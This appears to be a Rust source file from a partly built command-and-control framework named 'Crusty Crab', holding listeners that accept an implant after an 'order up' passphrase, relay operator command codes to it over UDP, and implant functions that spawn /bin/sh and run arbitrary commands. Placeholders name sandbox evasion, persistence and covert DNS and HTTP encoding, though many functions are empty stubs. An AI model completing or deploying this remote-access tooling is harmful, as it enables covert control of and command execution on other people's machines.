/* CRUSTY CRAB API
 * Authors: Robert Heine, Alexander Schmith, Chandler Hake
 * Source: https://github.com/AlexSchmith/CrustyCrab
 */

use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::format;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::thread;

/*****************************/
/*     USEFUL STRUCTURES     */
/*****************************/

pub struct SystemInfo {
    arch: String,
    os: String,
    hostname: String,
}

pub struct Listener {
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

pub struct SharedBuffer {
    pub cc: u8,
    pub buff: Vec<u8>,
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    match protocol {
        "udp" => listen_udp(lsn, address, sb),
        "tcp" => listen_tcp(lsn, address, sb),
        "http" => listen_tcp(lsn, address, sb),
        "dns" => listen_udp(lsn, address, sb),
        &_ => todo!(),
    }
}

/****************************/
/*     LISTENER METHODS     */
/****************************/

// listens using a TcpListener
fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    lsn.status = 1;
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening tcp listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 {
            break;
        }

        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 2048];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2;
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream, sb);
                    lsn.status = 1;
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0;
}

// listens using a UdpSocket
fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    // Setup socket to listen for implant connection
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).expect("Couldnt bind address"));
    lsn.udp_sock.as_ref().expect("udp socket not initialized").set_read_timeout(Some(Duration::from_millis(5))).expect("set_read_timeout failed");
    println!("[+] Opening udp listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 {
            break;
        }

        let mut buffer = [0; 2048];
        let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            // switches to interact mode
            interact_udp(lsn, src, sb);
            lsn.status = 1;
        }
    }
    lsn.status = 0;
}

// handles interaction with the implant
// acts as a middleman between the implant and client
fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("[+] Connection established by listener {}", lsn.id);
    let mut is_interacting: bool = false;
    loop {
        // live interaction with the implant
        if is_interacting {


            // checks if client is terminating interaction with target_src

            // otherwise interact normally

        }
        else {
            // check for client commands
            let cc: u8 = rcv_client_command(lsn, sb);
            match cc {
                // go back to listening mode
                3 => {
                    // tell the implant to go dormant
                    let code: u8 = 69;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    return;
                },
                // send a single line command to the implant to execute
                4 => {
                    let mut flag: bool = true;
                    while flag {

                        let mut sb_copy = sb.lock().unwrap();
                        if !vec_is_zero(&sb_copy.buff) {
                            let code: u8 = 1;
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                            flag = false;
                        }
                        else {
                            thread::sleep(Duration::from_millis(10));
                        }
                    }
                },
                // tell implant to create a shell and begin interacting with it
                5 => {
                    is_interacting = true;
                    let code: u8 = 2;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                },
                _u8 => todo!(),
            }
        }
    }
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

// recieves a single byte from the client: the command code
// this command code, represented as an integer, determines
// what the client wants the listener to do
// anything not explicitly listed below => no command recieved, do nothing
// 1 => send all information about the listener
// 2 => stop listening
// 3 => terminate anchovy connection
// 4 => prepare to send_cmd to an anchovy
// 5 => begin shell on anchovy
// 6 => terminate shell on anchovy
fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> u8 {
    let mut sb_ref = sb.lock().unwrap();
    // only action needed to be taken inside this function is to send back listener info
    if sb_ref.cc == 1 {
        let mut lsn_info = get_lsn_info(lsn);
        // TODO: send lsn_info back to client
    }
    // just for testing
    let cc = sb_ref.cc;
    let confirm = format!("Control Code Recieved: {cc}");
    sb_ref.buff = confirm.as_bytes().to_vec();
    return sb_ref.cc;
}

// Returns a string containing the full info of a given listener
pub fn get_lsn_info(lsn: &mut Listener) -> String {
    let mut stat: &str;
    match lsn.status {
        0 => stat = "Idle",
        1 => stat = "Listening",
        2 => stat = "Bound",
        _u8 => todo!(),
    }
    let id: u64 = lsn.id;
    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
    return lsn_info;
}

/*****************************************/
/*     ENCRYPTION/DECRYPTION METHODS     */
/*****************************************/

// Boiler function for encoding our commands into a dns packet
pub fn encode_dns(){

}

// Boiler function for encoding our commands into a http packet
pub fn encode_http(){

}


// Boiler function for decoding a dns packet for our code to read
pub fn decode_dns(){

}

// Boiler function for decoding an http packet into our own protocol
pub fn decode_http(){

}

/***************************/
/*     IMPLANT METHODS     */
/***************************/

// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}

// main method for implants
// dispatches to other methods based on network protocol
pub fn imp_run(protocol: &str, address: SocketAddr) {
    // TODO
}

// main for a udp implant
fn imp_udp(lsn_addr: SocketAddr) {
    // sandbox evasion

    // persistence

    // get public facing IP and pick a port, then initialize socket
    // for sake of demos, stick to localhost
    let address = SocketAddr::from(([127, 0, 0, 1], 2973));
    let mut sock = UdpSocket::bind(address).unwrap();

    // try to connect back to listener


    // once connected, listen for control code
}

// main for a tcp implant
fn imp_tcp(address: SocketAddr) {

}


/*******************************/
/*     MISC HELPER METHODS     */
/*******************************/

// returns true if the vector is all zero
pub fn vec_is_zero(buffer: &Vec<u8>) -> bool {
    for byte in buffer.into_iter() {
        if *byte != 0 {
            return false;
        }
    }
    return true;
}
